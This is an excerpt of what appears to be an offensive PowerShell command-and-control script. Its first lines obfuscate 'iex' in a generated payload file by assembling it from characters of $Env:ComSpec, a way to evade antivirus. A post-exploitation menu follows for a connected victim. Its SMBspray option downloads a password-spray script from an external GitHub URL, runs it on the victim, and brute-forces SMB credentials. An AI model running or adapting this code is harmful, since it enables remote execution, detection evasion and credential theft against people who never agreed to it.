...
#((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "$ttl","I``E``X")|Set-Content -Path $IPATH$payload_name.ps1
#((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "$ttl","&(''.SubString.ToString()[67,72,64] -Join'')")|Set-Content -Path $IPATH$payload_name.ps1
((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "$ttl","&(`$Env:ComSpec[4,15,25] -Join '')")|Set-Content -Path $IPATH$payload_name.ps1
#((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "$ttl","Get-Date -Format 'HH:mm:ss';&(`$Env:ComSpec[4,15,25] -Join '')")|Set-Content -Path $IPATH$payload_name.ps1
...
While($Client.Connected)
{
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "PostExploit" -or $Command -ieq "post")
    {
      ...
      write-host "   SMBspray  Brute-force local host smb creds";
      ...
      If($choise -ieq "SMBspray")
      {
           ...
           Write-Host " * Starting SMB password spray attack." -ForegroundColor Green
           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/smblogin-spray.ps1`" -OutFile `"`$Env:TMP\smblogin-spray.ps1`"|Unblock-File;Powershell -File `$Env:TMP\smblogin-spray.ps1 -DomainName `"$DomainName`" -Password `"$Password`" -StartRange `"$StartRange`" -EndRange `"$EndRange`" -Force 'True' -Egg 'True'"
      }
